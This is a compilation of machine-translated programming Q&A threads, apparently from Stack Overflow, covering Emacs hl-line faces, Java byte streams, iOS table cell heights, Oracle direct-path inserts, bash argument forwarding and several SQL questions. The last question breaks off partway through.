我通常让 hl-line 采用较暗的当前背景阴影。这在编辑缓冲区时效果很好。但是，在某些缓冲区中，例如 Org 议程和 Gnus 组缓冲区，我想使用更漂亮的颜色（代替光标）。

具体来说，我想更改 gnus-hl-line中 hl-line 的颜色，*而不*影响其他缓冲区中 hl-line 的颜色。

```
(add-hook 'gnus-summary-mode-hook 'gnus-hl-line)
(add-hook 'gnus-group-mode-hook 'gnus-hl-line)

(defun gnus-hl-line ()
  (hl-line-mode 1)
  (set (make-local-variable 'line-move-visual) nil)
  (setq cursor-type nil)) 
```

谢谢，

使用菲尔的建议的最终解决方案。它大部分时间使用中性的 hl 线，但有时粗体 hl 线是可观的，例如在 Gnus 和 Org 议程中

```
;; From emacs-wiki:
(defun shade-color (intensity)
  "print the #rgb color of the background, dimmed according to intensity"
  (interactive "nIntensity of the shade : ")
  (apply 'format "#%02x%02x%02x"
         (mapcar (lambda (x)
                   (if (> (lsh x -8) intensity)
                       (- (lsh x -8) intensity)
                     0))
                 (color-values (cdr (assoc 'background-color (frame-parameters)))))))

;; Default hl
(global-hl-line-mode t)
(make-variable-buffer-local 'global-hl-line-mode)
(set-face-background hl-line-face (shade-color 08))  

(defface hl-line-highlight-face
  '((t :inherit highlight))
  "Face for highlighting the current line with `hl-line-fancy-highlight'."
  :group 'hl-line)

(defun hl-line-fancy-highlight ()
  (set (make-local-variable 'hl-line-face) 'hl-line-highlight-face)
  ;;    (set (make-local-variable 'line-move-visual) nil)
  ;;    (set (make-local-variable 'cursor-type) nil)
  (setq global-hl-line-mode nil)
  (hl-line-mode))

(add-hook 'org-agenda-mode-hook 'hl-line-fancy-highlight)
(add-hook 'gnus-summary-mode-hook 'hl-line-fancy-highlight)
(add-hook 'gnus-group-mode-hook 'hl-line-fancy-highlight) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T02:15:21.520

`hl-line-face`是一个包含要使用的面的变量`hl-line-mode`，因此我们可以在这些模式下将该变量设置为缓冲区局部，并为其分配一个新的自定义面。

您可以像这样创建一个新面孔：

```
(defface gnus-hl-line
  '((t :inherit hl-line))
  "Face for highlighting the current line with `gnus-hl-line'."
  :group 'hl-line) 
```

并使用`M-x` `customize-face` `RET` `gnus-hl-line` `RET`

然后将其添加到您的`gnus-hl-line`函数中（在调用`hl-line-mode`之前似乎最明智）。

```
(set (make-local-variable 'hl-line-face) 'gnus-hl-line) 
```

# java - java图像数据输入流

> ID：10239039
> 
> 赞同：0
> 
> 时间：2012-04-20T01:25:50.283
> 
> 标签：java, image, byte, inputstream

下面的方法将 InputStream 中的数据作为字符串返回，其中将使用 StringBuilder 构造字符串

```
String getBytes(InputStream is) throws IOException{
   StringBuilder sb = new StringBuilder();
   int ch;
   while ((ch = is.read()) != -1) sb.append((char)ch);
   is.close();
   return sb.toString();
} 
```

但这种方法不适用于图像数据。最好的解决方案是构建类似的方法，但返回字节 [] 而不是字符串。能告诉我怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:39:03.940

希望这是您正在寻找的。我将此函数用于我的 Imgur 应用程序，该应用程序需要 ByteArray 形式的图像。

```
static File imgFile;
static ByteArrayOutputStream imgStream = new ByteArrayOutputStream();

public static void bufferImage() {
        try {
                BufferedImage bufImg = ImageIO.read(imgFile);
                ImageIO.write(bufImg, getExtension(imgFile), imgStream);
         } catch (IOException ex) {
                System.out.println("Error buffering image");
           }   
    } 
```

如果您愿意，我也可以提供 getExtension 功能。

# ios - 所有方向的 UITableViewCell 中的动态 UILabel 高度/宽度

> ID：10239040
> 
> 赞同：15
> 
> 时间：2012-04-20T01:25:53.297
> 
> 标签：ios, uikit

我的问题基本上归结为**在 UITableCell 中支持 UILabel（我想是其他元素）的动态高度的最佳方法**，并且**在旋转时正确调整标签宽度/高度和单元格高度**。

我知道如何获得 UILabel 的预期高度，并相应地调整高度，但是当你也支持横向时，事情似乎变得相当棘手。

我想这可能会走[layoutSubviews](https://stackoverflow.com/questions/1303695/adjusting-the-positions-of-the-labels-in-a-uitableviewcell)的路线，但我不确定你如何将它与需要计算单元格高度的表格结合起来。[另一个有趣的帖子](https://stackoverflow.com/questions/6105489/autoresizing-uitablecells-contents-in-landscape)在 init 上手动设置框架，以确保他们根据已知数量进行计算，但这仅解决了部分问题。

所以这是我正在处理的图像，红色箭头指向动态高度标签，蓝色箭头指向将改变高度的单元格。

![动态UILabel/单元格高度/宽度](../Images/0a012580c61e55cc21ec9c21a790ef99.png)

我设法让它正常工作，但不确定它是否是正确的方法。

## 以下是我学到的一些东西：

*   cell.frame`cellForRowAtIndexPath`总是在纵向模式下给出它的大小。（即对于 iphone 应用程序，它总是报告 320）。
*   将原型单元格存储在属性中以供参考具有相同的问题，始终处于纵向模式
*   在这个用例中，自动调整标签宽度的掩码似乎没用，实际上会导致计算的旋转高度出现问题
*   中的 tableView.frame 以`cellForRowAtIndexPath`正确的方向给出其大小
*   你需要调用`[tableView reloadData]`轮换。我找不到任何其他方法来更新单元格和标签高度

## 以下是我为使其工作而采取的步骤：

1.  禁用 UILabel 上的任何自动调整大小蒙版，因为它们会因某种原因干扰获得正确的标签高度
2.  在`viewDidLoad`我获取每个标签字体的引用，以及与纵向 tableView 相比的标签宽度百分比的浮点数

    ```
    CWProductDetailDescriptionCell *cell = [self.tableView dequeueReusableCellWithIdentifier:@"DescriptionCell"];
    self.descriptionLabelWidthPercentage = cell.descriptionLabel.frame.size.width / 320;
    self.descriptionLabelFont = cell.descriptionLabel.font; 
    ```

3.  在`heightForRowAtIndexPath`我使用 tableView 宽度和我已经抓取的百分比计算单元格高度时：

    ```
    case TableSectionDescription:
        CGFloat labelWidth = self.tableView.frame.size.width * self.descriptionLabelWidthPercentage;
        CGSize newLabelFrameSize = [self sizeForString:self.product.descriptionText WithConstraint:CGSizeMake(labelWidth, MAXFLOAT) AndFont:self.descriptionLabelFont];
        return newLabelFrameSize.height + kTextCellPadding; 
    ```

4.  在`cellForRowAtIndexPath`我计算标签框架的框架并更新它

    ```
    cell = [tableView dequeueReusableCellWithIdentifier:@"DescriptionCell"];
    ((CWProductDetailDescriptionCell *)cell).descriptionLabel.text = self.product.descriptionText;
    CGRect oldFrame = ((CWProductDetailDescriptionCell *)cell).descriptionLabel.frame;
    CGFloat labelWidth = self.tableView.frame.size.width * self.descriptionLabelWidthPercentage;
    CGSize newLabelFrameSize = [self sizeForString:self.product.descriptionText WithConstraint:CGSizeMake(labelWidth, MAXFLOAT) AndFont:((CWProductDetailDescriptionCell *)cell).descriptionLabel.font];
    ((CWProductDetailDescriptionCell *)cell).descriptionLabel.frame = CGRectMake(oldFrame.origin.x, oldFrame.origin.y, labelWidth, newLabelFrameSize.height); 
    ```

5.  在`didRotateFromInterfaceOrientation`你需要`[self.tableView reloadData]`

## 这种方法的问题：

1.  您无法利用[可能在 IB 中设置的自动调整大小掩码和边距](http://screencast.com/t/Zpxf2HAcI)
    *   直到您返回单元格之后，那些似乎才触发`cellForRowAtIndexPath` **（不确定这是否完全正确）**
    *   他们以某种方式弄乱了高度计算，并且您的标签最终[比](http://screencast.com/t/j6DJpVYv)景观中的[期望高。](http://screencast.com/t/aD3AxDAU)
2.  [如果您的标签宽度在纵向](http://screencast.com/t/GJglYeeKuD4)和[横向](http://screencast.com/t/8i72MeRNDKSM)中的百分比不相等，则您需要知道这两个百分比
3.  您需要知道/计算您的标签宽度百分比。理想情况下，您可以在自动调整大小的蒙版完成其操作后即时计算这些。
4.  只是感觉很笨拙。我有一种感觉，在带有缩进的编辑模式下我会遇到更多的麻烦。

**所以。这样做的正确方法是什么？我见过很多这样的问题，但没有一个能完全解决这个问题。**

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-04-20T04:16:22.277

Apparently it took writing out my giant question and taking a break from the computer to figure it out.

# So here's the solution:

## The main steps to dynamically calculate UILabel heights on the fly, and take advantage of autoresizing masks:

1.  Keep a prototype cell for each cell that will need to have its height adjusted
2.  In `heightForRowAtIndexPath`
    *   adjust your reference cell width for the orientation you are in
    *   thenyou can then reliably use the contained UILabel frame widths for calculating height
3.  Don't do any frame adjustments in `cellForRowAtIndexPath` aside from initial setup
    *   UITableViewCells perform all their layout stuff right after this is called, so your efforts at best are futile, at worst they screw things up
4.  Do your frame adjustments in `willDisplayCell forRowAtIndexPath`
    *   I'm furious I forgot about this
    *   It occurs after all the UITableViewCell internal layout and right before it draws
    *   Your labels with autoresizing masks on them will already have correct widths you can use for calculations

### In viewDidLoad grab references to cells that will need height adjustments

Note that these are retained/strong(ARC), and never added to the table itself

```
self.descriptionReferenceCell = [self.tableView dequeueReusableCellWithIdentifier:@"DescriptionCell"];
self.attributeReferenceCell = [self.tableView dequeueReusableCellWithIdentifier:@"AttributeCell"]; 
```

### In `heightForRowAtIndexPath` do calculation for variable height cells

I first update the width of my reference cell so that it lays out its subviews (UILabels), which I can then use for calculations. Then I use the updated label width to determine the height of my labels, and add any necessary cell padding to calculate my cell height. (Remember these calculations are only necessary if your cell changes heights along with your label).

```
UIDeviceOrientation orientation = [[UIDevice currentDevice] orientation];
float width = UIDeviceOrientationIsPortrait(orientation) ? 320 : 480;

case TableSectionDescription:
    CGRect oldFrame = self.descriptionReferenceCell.frame;
    self.descriptionReferenceCell.frame = CGRectMake(oldFrame.origin.x, oldFrame.origin.y, width, oldFrame.size.height);
    CGFloat referenceWidth = self.descriptionReferenceCell.descriptionLabel.frame.size.width;
    CGSize newLabelFrameSize = [self sizeForString:self.product.descriptionText WithConstraint:CGSizeMake(referenceWidth, MAXFLOAT) AndFont:self.descriptionReferenceCell.descriptionLabel.font];
    return newLabelFrameSize.height + kTextCellPadding; 
```

### In `cellForRowAtIndexPath` Don't do any dynamic layout related updates relying on orientation

### In `willDisplayCell forRowAtIndexPath` Update the label heights themselves

Since the table cells have performed `layoutSubviews`, the labels already have the correct widths, which I use to calculate the exact height of the labels. I can safely update my label heights.

```
case TableSectionDescription:
    CGRect oldFrame = ((CWProductDetailDescriptionCell *)cell).descriptionLabel.frame;
    CGSize newLabelFrameSize = [self sizeForString:self.product.descriptionText WithConstraint:CGSizeMake(oldFrame.size.width, MAXFLOAT) AndFont:((CWProductDetailDescriptionCell *)cell).descriptionLabel.font];
    ((CWProductDetailDescriptionCell *)cell).descriptionLabel.frame = CGRectMake(oldFrame.origin.x, oldFrame.origin.y, oldFrame.size.width, newLabelFrameSize.height);
    break; 
```

### Reload Data on rotate

Your visible cells won't update their heights and labels if you don't reload data.

```
-(void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation{
    [self.tableView reloadData];
} 
```

The only other thing to point out is that I'm using a helper class for calculating the label height that just wraps the basic call. Really its not saving much of any code anymore (I used to have other stuff in there), so just use the normal method straight off your string.

```
- (CGSize) sizeForString:(NSString*)string WithConstraint:(CGSize)constraint AndFont:(UIFont *)font {
    CGSize labelSize = [string sizeWithFont:font
                          constrainedToSize:constraint 
                              lineBreakMode:UILineBreakModeWordWrap];
    return labelSize;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T05:19:18.393

我同意你的大部分意见。不过有几点想法：

你说：

> cellForRowAtIndexPath 中的 cell.frame 始终以纵向模式给出其大小。（即对于 iphone 应用程序，它总是报告 320）。

这不是我的经验。在我的`tableView:cellForRowAtIndexPath`我只是放了一个

```
NSLog(@"Cell frame.size.width=%f", cell.frame.size.width); 
```

它根据方向报告 320 或 480。所以，将我的帧计算逻辑移到 willDisplayCell 中，我没有看到任何好处。

你说：

> 在`heightForRowAtIndexPath`我使用 tableView 宽度和我已经抓取的百分比计算单元格高度时：

是的，你可以这样做。如果您在单元格右侧的描述可能真的很长，您可能希望将单元格左侧的标签保持固定宽度，并利用更宽的屏幕来真正最大化您的长描述单元格的右侧。但是，如果您经常在右侧有较短的描述，则根据屏幕宽度的目标百分比重新对齐是个好主意。就个人而言，我可能不会根据百分比转换像素，而是使用固定比率（例如，左侧的标签总是占宽度的 33%，右侧的标签总是占单元格的 66%，它可能会简化百分比逻辑，尽管它在功能上是等价的）。

你说：

> 您无法利用可能在 IB 中设置的自动调整大小掩码和边距

是的，我从未尝试过（在此之前，我看到了您描述的相同行为），但即使它确实有效，这也是一个坏主意，因为您确实需要根据您正在使用的自动换行重新计算高度，所以虽然它可能会让你接近，但无论如何你仍然需要重新计算高度才能让它正确。（坦率地说，我只是希望我可以说“根据标签的字体、宽度和文本自动调整高度，但这并不存在。）不过，我同意你的观点，它不能更好地工作很奇怪。自动调整应该更优雅地处理这个问题。

你说：

> 如果您不重新加载数据，您的可见单元格将不会更新其高度和标签。

然后你建议调用`reloadData`. 但现在还`didRotateFromInterfaceOrientation`为时不晚，因为我看到我的肖像 UILabel 在它进入风景后立即闪现，但在此处调用的风景重绘发生之前。我不想继承 UITableViewCell 和 override `drawRect`，但我不确定在横向绘制 UILabel 帧之前如何重新布局它们。我最初尝试将其移至此`willRotateToInterfaceOrientation`并没有奏效，但也许我没有在那里做某事。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-26T20:48:25.203

谢谢，这很有帮助。不过，我不想硬编码任何宽度。我花了很长时间研究这个问题，这就是我发现的。

基本上，有一个先有鸡还是先有蛋的问题，表格视图需要知道单元格的高度才能进行自己的布局，但是单元格需要针对包含表格视图的几何形状进行配置，然后才能确定其高度决定。

打破这种循环依赖的一种方法是将宽度硬编码为 320 或 480，这是本页其他地方的建议。不过，我不喜欢硬编码大小的想法。

另一个想法是使用原型单元预先计算所有高度。我尝试了这个，但仍然遇到计算错误的高度，因为创建 a`UITableViewCell`只会留下一个未针对表格视图的实际样式和大小配置的单元格。显然没有办法手动为特定的表格视图配置单元格；你必须让它`UITableView`去做。

**我决定的策略是让表格视图像往常一样做所有事情，包括创建和配置自己的单元格，*然后*一旦设置了所有单元格，计算实际行高并刷新表格视图。**缺点是表格视图被加载了两次（一次使用默认高度，另一次使用适当的高度），但优点是这应该是一个相当干净和健壮的解决方案。

* * *

此示例假定您有一个实例变量`_cellHeights`，它是一个数组数组，用于保存每个表视图部分的计算行高：

```
@interface MyViewController () {
    NSArray *_cellHeights; // array of arrays (for each table view section) of numbers (row heights)
} 
```

编写一个基于当前单元格内容计算所有单元格高度的方法：

```
- (void)_recalculateCellHeights
{
    NSMutableArray *cellHeights = [[NSMutableArray alloc] init];

    for (NSUInteger section=0; section<[self.tableView numberOfSections]; section++) {
        NSMutableArray *sectionCellHeights = [[NSMutableArray alloc] init];

        for (NSUInteger row=0; row<[self.tableView numberOfRowsInSection:section]; row++) {
            NSIndexPath *indexPath = [NSIndexPath indexPathForRow:row inSection:section];
            UITableViewCell *cell = [self.tableView cellForRowAtIndexPath:indexPath];

            // Set cell's width to match table view's width
            CGRect cellFrame = cell.frame;
            cellFrame.size.width = CGRectGetWidth(self.tableView.frame);
            cell.frame = cellFrame;

            CGFloat cellHeight = self.tableView.rowHeight; // default

            if (cell.textLabel.numberOfLines == 0 || (cell.detailTextLabel && cell.detailTextLabel.numberOfLines == 0)) {
                [cell layoutIfNeeded]; // this is necessary on iOS 7 to give the cell's text labels non-zero frames

                // Calculate the height of the cell based on the text
                [cell.textLabel sizeToFit];
                [cell.detailTextLabel sizeToFit];

                cellHeight = CGRectGetHeight(cell.textLabel.frame) + CGRectGetHeight(cell.detailTextLabel.frame);

                // This is the best I can come up with for this :(
                if (self.tableView.separatorStyle != UITableViewCellSeparatorStyleNone) {
                    cellHeight += 1.0;
                }
            }

            [sectionCellHeights addObject:[NSNumber numberWithFloat:cellHeight]];
        }

        [cellHeights addObject:sectionCellHeights];
    }

    _cellHeights = cellHeights;
} 
```

在`-tableView:cellForRowAtIndexPath:`中，正常创建一个单元格并填写 textLabel，而不执行任何布局（正如 Bob 在本页其他地方提到的那样：“UITableViewCells 在调用此操作后立即执行所有布局内容，因此您的努力充其量是徒劳的，最坏的情况是它们把事情搞砸了”）。重要的是将标签的`numberOfLines`属性设置为 0 以允许动态高度。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];

        // Assign any fonts or other adjustments which may affect height here

        // Enable multiple line support so textLabel can grow vertically
        cell.textLabel.numberOfLines = 0;
    }

    // Configure the cell...
    cell.textLabel.text = [self.texts objectAtIndex:indexPath.section];

    return cell;
} 
```

在`-tableView:heightForRowAtIndexPath:`中，返回预先计算的像元高度：

```
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (_cellHeights) {
        NSArray *sectionCellHeights = [_cellHeights objectAtIndex:indexPath.section];
        return [[sectionCellHeights objectAtIndex:indexPath.row] floatValue];
    }

    return self.tableView.rowHeight; // default
} 
```

在`-viewDidAppear:`中，触发重新计算单元格高度并刷新表格。请注意，这必须发生在某个`-viewDidAppear:`时间，而不是`-viewWillAppear:`某个时间，因为在`-viewWillAppear:`某个时间，单元格尚未针对表格视图的几何形状进行配置。

```
- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];

    [self _recalculateCellHeights];
    [self.tableView reloadData];
} 
```

在`-didRotateFromInterfaceOrientation:`中，做同样的事情：

```
- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation
{
    [self _recalculateCellHeights];
    [self.tableView reloadData];
} 
```

没有必要在`-tableView:willDisplayCell:forRowAtIndexPath:`.

# oracle - 什么会导致 Oracle 忽略请求它执行直接路径加载的 APPEND 提示？

> ID：10239043
> 
> 赞同：3
> 
> 时间：2012-04-20T01:26:11.423
> 
> 标签：oracle, insert, oracle10g, hint

我希望从一个表到另一个表进行批量数据的串行记录插入。这是一次作为数据迁移的一部分，因此交换分区等不是一个答案。

SQL 将具有以下结构：

```
INSERT /*+ APPEND */ ... SELECT FROM .... 
```

什么可能导致 Oracle 以常规插入而不是直接路径插入来运行此操作？

例如，我相信在表上有一个触发器会导致 Oracle 进行常规插入。是否有明确的限制清单？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T02:47:06.657

来自 [http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID:1211797200346279484](http://asktom.oracle.com/pls/asktom/f?p=100:11:0::::P11_QUESTION_ID:1211797200346279484)的引用：

“当表具有引用完整性或触发器时，插入 /*+ 附加 */ 将忽略附加提示并使用常规路径加载......” - Tom Kyte

来自[https://docs.oracle.com/cd/E18283_01/server.112/e17118/statements_9014.htm#sthref6486](https://docs.oracle.com/cd/E18283_01/server.112/e17118/statements_9014.htm#sthref6486)

> 直接路径 INSERT 受到许多限制。如果违反了这些限制中的任何一个，则 Oracle 数据库将连续执行常规 INSERT 而不返回任何消息，除非另有说明：
> 
> *   您可以在单个事务中拥有多个直接路径 INSERT 语句，无论是否有其他 DML 语句。但是，在一个 DML 语句更改特定表、分区或索引后，事务中的其他 DML 语句就不能访问该表、分区或索引。
>     
>     
> *   在直接路径 INSERT 语句之前允许访问同一个表、分区或索引的查询，但不允许在它之后。
>     
>     
> *   如果任何串行或并行语句尝试访问已由同一事务中的直接路径 INSERT 修改的表，则数据库将返回错误并拒绝该语句。
>     
>     
> *   目标表不能属于集群。
>     
>     
> *   目标表不能包含对象类型列。
>     
>     
> *   如果索引组织表 (IOT) 未分区、具有映射表或被实体化视图引用，则不支持直接路径 INSERT。
>     
>     
> *   直接路径插入到索引组织表 (IOT) 的单个分区，或插入到只有一个分区的分区 IOT 中，将连续完成，即使 IOT 是在并行模式下创建的，或者您指定了 APPEND 或 APPEND_VALUES 提示. 但是，只要不使用分区扩展名称并且 IOT 具有多个分区，对分区 IOT 的直接路径 INSERT 操作将支持并行模式。
>     
>     
> *   目标表上不能定义任何触发器或参照完整性约束。
>     
>     
> *   无法复制目标表。
>     
>     
> *   包含直接路径 INSERT 语句的事务不能或变为分布式。

但是，手册中的列表并不详尽，也不完全准确。例如，[如果该约束是引用分区的一部分，则引用完整性约束不会阻止直接路径 INSERT](https://stackoverflow.com/q/23330143/409172)。

# java - 最终局部变量可能尚未在匿名内部类中初始化

> ID：10239046
> 
> 赞同：7
> 
> 时间：2012-04-20T01:26:50.503
> 
> 标签：java, callback, anonymous-types, final

这是我的代码：

```
final Foo myFoo = new Foo(new Inner() {
    @Override
    callback(){
         myFoo.bar();
    }
}); 
```

（使用实际的函数名称）

```
final MyArrayAdapter aa = new MyArrayAdapter(new View.OnClickListener() {
    @Override
    onClick(){
         aa.notifyDataSetChanged();
    }
}); 
```

Java 给我一个关于 myFoo 可能没有被初始化的错误。有没有什么办法解决这一问题？我可以在构造对象时将回调设置为 null，然后再对其进行更改，但我希望有一种更简洁的方法。有任何想法吗？（如果 Foo 不是我写的并且没有公开接口以稍后更改回调，那么这也行不通）

如果有人好奇，在我的具体场景中，Foo 是一个 ArrayAdapter，而 bar 是 notifyDataSetChanged()。适配器显示的内容取决于数组中项目的值，并且这些值在单击时会发生变化。回调是 clickListener。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T02:34:39.843

简短的回答是你绝对不能在 Java 中这样做，但编译器已经告诉你了。您试图一次创建两个相互引用的对象，这是一个先有鸡还是先有蛋的问题。最重要的是，您必须首先创建其中一个。

建议是两步创建：

```
....
final MyArrayAdapter aa = new MyArrayAdapter();
aa.initializeButtonClickListener();
.... 
```

然后将'initialize'方法添加到适配器。

```
public void initializeButtonClickListener(){
    this.button.setOnClickListener(new View.OnClickListener() {
        @Override
        onClick(){
             notifyDataSetChanged();
        }
    });
} 
```

因为该构造有点复杂（即，比简单地调用构造函数更复杂），所以我建议将这两行拉入`MyArrayAdapter`工厂方法，并使构造函数私有。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T02:37:14.897

这通常可以工作并且无需访问`Inner`定义，但您确实需要创建一个帮助器类：

```
class CallbackHelper {
    private Foo foo;
    public void setFoo( Foo f ){ foo = f; }
    public Foo getFoo(){ return foo; }
} 
```

然后像这样使用它：

```
final CallbackHelper cbh = new CallbackHelper();
Foo myFoo = new Foo(new Inner() {
    @Override
    callback(){
         cbh.getFoo().bar();
    }
});
cbh.setFoo( myFoo ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T01:34:50.853

您可以在包含类中声明一个方法`callBarOnMyFoo`并从您的回调中调用它：

```
void callBarOnMyFoo() {
    myFoo.bar();
} 
```

然后你的回调需要调用`callBarOnMyFoo`，它是外部类的一个实例方法，`Inner`代码应该引用它（我忘记了它的语法）。

# java - Java 快速创建具有一组可能性的数组的方法

> ID：10239047
> 
> 赞同：1
> 
> 时间：2012-04-20T01:26:53.163
> 
> 标签：java, arrays, multidimensional-array, osx-lion, set

什么是创建具有一组可能性的二维数组的快速简单的方法？

例如，如果数字是 5，我希望数组是：

```
{{0,1},{0,2},{0,3},{0,4},{1,2},{1,3},{1,4},{2,3},{2,4},{3,4}} 
```

如果数字是 6，

```
{{0,1},{0,2},{0,3},{0,4},{0,5},{1,2},{1,3},{1,4},{1,5},{2,3},{2,4},{2,5},{3,4},{3,5},{4,5}} 
```

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T01:29:11.903

```
List<int[]> a = new ArrayList<int[]>();
for (int i = 0; i < n; i++) {
    for (int j = i + 1; j < n; j++) {
        a.add(new int[]{i, j});
    }
}
return (int[][])a.toArray(new int[0][0]); 
```

# treeview - 带有复选按钮的 Tcl Tk 树视图

> ID：10239048
> 
> 赞同：1
> 
> 时间：2012-04-20T01:27:35.073
> 
> 标签：treeview, tcl, tk

是否可以将检查按钮添加到 ttk::treeview 列。

具体来说，我正在尝试为用户创建一个清单，以便在选中或取消选中复选框时在画布上隐藏或显示项目。由于有很多具有特定类型和子类型的画布项目，我需要一种列表框机制。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T08:33:27.780

首先，我认为您在正确的 UI 轨道上使用复选框树（以及我认为的其他内容？描述性文本在帮助用户使用复杂的 UI 时很好。）但是现在，坏消息。

这不是[treeview](http://www.tcl.tk/man/tcl8.6/TkCmd/ttk_treeview.htm)小部件真正支持的东西。特别是，它没有嵌入小部件的能力，也没有太多内置支持来处理行上的事件。虽然可以一起破解一些东西——你总是可以添加自己的自定义绑定，使用提供的小部件工具来解码位置信息，并通过适当的图像模拟按钮——但这将是很多工作，而且肯定会一个黑客。

我最好的建议是您尝试使用[tktreectrl](http://tktreectrl.sourceforge.net/)小部件。它是一个外部包，但它非常强大（以至于大多数时候人们将它包装在代码中以驯服它！）并且仅查看链接页面上的一些演示让我认为它可以做你想要的。唉，我没有使用它的个人经验，所以我不能提供详细的说明。

# sql-server - 如何在不循环 SQL Server 的情况下更新每条记录

> ID：10239050
> 
> 赞同：1
> 
> 时间：2012-04-20T01:27:38.753
> 
> 标签：sql-server

我有一个表和包含的数据如下所示，它被称为 TABLE_A

```
+++++++++++++++++++++++++++++++++++++++++++++++++
主ID | Col2 | 次要ID
+++++++++++++++++++++++++++++++++++++++++++++++++
1 | 说明 1 | 0
2 | 说明 2 | 0
3 | 说明 3 | 0
4 | 说明 4 | 0
. | ... | .
. |
.

```

请参阅上面的**SecondaryID**。它的初始值为零

我有另一个表，它叫做 TABLE_B，在下面

```
+++++++++++++++++++++++++++++++++++++++++++++++++
主ID | Col2 | 外键ID
+++++++++++++++++++++++++++++++++++++++++++++++++
1 | 说明 1 | 123
2 | 说明 2 | 320
3 | 说明 3 | 111
4 | 说明 4 | 999
. | ... | .
. |
.

```

我在 SQL Server 中遇到问题，如何使用 TABLE_A 上的**ForeignKeyID值更新 TABLE_A 上的****SecondaryID**列，对于TABLE_A 的 PrimaryID 中的每一行等于 TABLES_B 的 PrimaryID。但是，我不想使用 LOOPING CURSORS 或其他方法来解决这个问题。

 **有简单的方法吗？？

我急需，提前谢谢你。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-20T01:43:54.497

是的，您可以在 UPDATE 操作中进行连接。如下：

```
UPDATE table_a SET SecondaryID = b.ForeignKeyID
FROM table_a a
    JOIN table_b b
    on a.PrimaryID = b.PrimaryID 
```

[http://sqlfiddle.com/#!3/fdcdb/6](http://sqlfiddle.com/#!3/fdcdb/6)**

# ruby-on-rails - Ruby 1.9.3 哈希语法不适用于 rspec-rails 2.9？

> ID：10239055
> 
> 赞同：2
> 
> 时间：2012-04-20T01:28:12.210
> 
> 标签：ruby-on-rails, ruby, rspec, rspec2, rspec-rails

我有一个刚开始的 Rails 3.2 项目，我正在尝试编写一些测试。

当我尝试使用 Ruby 1.9.3 的 JSON 式哈希语法并执行以下操作时：

```
let(:user) { User.new(first_name: 'Joe', last_name: 'Blow') } 
```

或这个：

```
let(:user) { User.new({first_name: 'Joe', last_name: 'Blow'}) } 
```

我收到此错误：

```
syntax error, unexpected ':', expecting ')' (SyntaxError)
  let(:user) { User.new(first_name: 'Joe', last_name: 'Blow') }
                                   ^ 
```

当我恢复到 :key => 'value' 语法时，rspec 然后查看我需要的 user.rb 文件，并说它也不知道那里存在的语法是怎么回事。

有什么办法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:39:18.370

确保您拥有最新版本的 Rspec-Rails。那应该这样做。

# bash - 如何在 bash 中正确“转发”函数参数？

> ID：10239056
> 
> 赞同：7
> 
> 时间：2012-04-20T01:28:20.377
> 
> 标签：bash, function, shell, arguments

我想知道如何将给函数的参数`bash`正确“转发”到另一个函数或程序。

例如，在 Mac OS X 中，有一个命令行程序`open`（[手册页](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/Manpages/man1/open.1.html)）将使用其默认应用程序打开指定的文件（即，它将在 Xcode 中打开 *.h 文件，或在 Finder 中打开文件夹等）。我想简单地调用`open`不带参数的方法来打开 Finder 中的当前工作目录，或者为其提供典型参数以正常使用它。

我想，“我就用一个函数！” 哈，我想那里没那么快。这是我所拥有的：

```
function open
{
    if [ $# -eq 0 ]; then
        /usr/bin/open .
    else
        /usr/bin/open "$*"
    fi
} 
```

简单的调用`open`效果很好，它会在 Finder 中打开工作目录。调用`open myheader.h`效果很好，它会在 Xcode 中打开“myheader.h”。

但是，调用`open -a /Applications/TextMate.app myheader.h`以尝试在 TextMate 而不是 Xcode 中打开文件会导致错误“无法找到名为'/Applications/TextMate.app myheader.h'的应用程序”。似乎传递`"$*"`给`/usr/bin/open`导致我的整个参数列表仅作为一个参数转发。

将函数更改为仅使用`usr/bin/open $*`（不引用）会导致带有空格的路径出现问题。然后调用`open other\ header.h`会导致错误“文件 /Users/inspector-g/other 和 /Users/inspector-g/header.h 不存在”，但解决了另一个问题。

必须有一些约定来转发我刚刚错过的论点。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-20T01:31:36.627

你确实错过了`"$@"`，这是为这种情况设计的。

# sql - 按列分组结果查询 (SQL Server)

> ID：10239057
> 
> 赞同：0
> 
> 时间：2012-04-20T01:28:23.420
> 
> 标签：sql, sql-server, coldfusion

我有一个多对多的关系`items`- `itemnames`-`languages`

`itemnames`不会出现在每种语言中。

我想得到一个所有项目只表示一次的结果，但能够将其设置`languageId`为默认值。

例如项目 1,2,3 用两种语言定义，项目 4 和 5 各有一种语言，但语言不同

```
[itemid][languageid][name]
1,       1,         item1
1,       2,         leItem1
2,       1,         item2
2,       2,         leItem2
3,       1,         item3
3,       2,         leItem3
4,       1,         item4
5,       2,         leItem5 
```

